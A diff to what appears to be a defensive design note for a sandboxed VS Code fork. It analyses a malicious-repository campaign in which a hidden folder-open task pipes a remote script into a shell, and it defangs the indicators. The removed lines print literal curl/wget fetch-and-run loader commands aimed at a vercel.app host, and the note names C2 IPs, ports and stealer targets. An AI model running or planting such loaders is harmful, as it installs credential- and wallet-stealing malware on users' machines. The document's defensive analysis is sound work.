@@ -16,18 +16,20 @@ both read on 2026-11-04.
 2. **Trust.** When the folder is opened, VS Code asks the user to trust it.
    The user agrees.
 3. **Loader.** `.vscode/tasks.json` has a task with `runOptions.runOn:
-   folderOpen` and hidden presentation. Its command is
-   `curl 'https://vscode-setup.vercel.app/settings/mac?flag=1' | sh`, or
-   `wget -qO- … | sh`, or `nohup bash -c "curl -s … | node"`.
-4. **Further stages.** These are downloaded from `*.vercel.app` into
+   folderOpen` and hidden presentation. Its command fetches a script with
+   curl or wget from `hxxps://vscode-setup[.]vercel[.]app/settings/mac?flag=1`
+   and pipes it into a shell, or runs `nohup bash -c` with the fetch piped
+   into node. (Written defanged on purpose: endpoint protection quarantines the literal
+   shape; EDR fixture-safety.)
+4. **Further stages.** These are downloaded from `*[.]vercel[.]app` into
    `~/.vscode`, and `env-setup.js` `eval`s code from
-   `ip-api-check-nine.vercel.app`.
+   `ip-api-check-nine[.]vercel[.]app`.
 5. **Payload.** A backdoor fingerprints the host and looks up its public IP
-   via `ipify.org`. It beacons to its C2 **every 5 s** and runs any JavaScript
+   via `ipify[.]org`. It beacons to its C2 **every 5 s** and runs any JavaScript
    it receives.
 6. **Stealer.** BeaverTail and Invisible Ferret steal browser credentials,
    wallet extensions, Solana keys and keychain databases. They exfiltrate over
-   **cleartext HTTP to a raw IP on port 1224** (`146.70.41.188:1224`), with
+   **cleartext HTTP to a raw IP on port 1224** (`146.70.41[.]188:1224`), with
    `api.npoint.io` as a fallback C2. <!-- fixture-lint: ignore -->
 
 Workspace Trust is the only barrier in stock VS Code, and the lure persuades
@@ -42,7 +44,7 @@ user making a correct decision**.
 | Campaign step | What happens in seclab-vscode | Where |
 |---|---|---|
 | Folder-open task runs `curl … \| sh` | The task runs **inside the tab sandbox**, never on the host. That is contained by construction: tasks, terminals and LSPs all run in the tab. | ARCHITECTURE §4.3, §4.7 |
-| `curl https://*.vercel.app/…` loader fetch | Denied **without a prompt**, because `*.vercel.app` is on the maintained risky-destination list and the user has not acted in the tab yet. The pipe to `sh` receives a JSON 403 body, not a script. | broker: `autoDenyRiskyBeforeUserAction`, [risky list](../broker-policy.md#risky-destinations-generated) |
+| Loader fetch from `hxxps://*[.]vercel[.]app/…` | Denied **without a prompt**, because `*.vercel.app` is on the maintained risky-destination list and the user has not acted in the tab yet. The pipe to `sh` receives a JSON 403 body, not a script. | broker: `autoDenyRiskyBeforeUserAction`, [risky list](../broker-policy.md#risky-destinations-generated) |
 | Even after the user acts | A prompt flags `risky-destination:hosting` and the claimed origin, and offers only *allow once* or *deny*. *Always allow* is never offered for hosting, paste or IP-echo hosts. | broker: per-approval `decisions` |
 | `ipify.org` public-IP lookup | Same handling (`ip-echo`). | risky list |
 | `api.npoint.io` fallback C2 | Same handling (`paste`). | risky list |
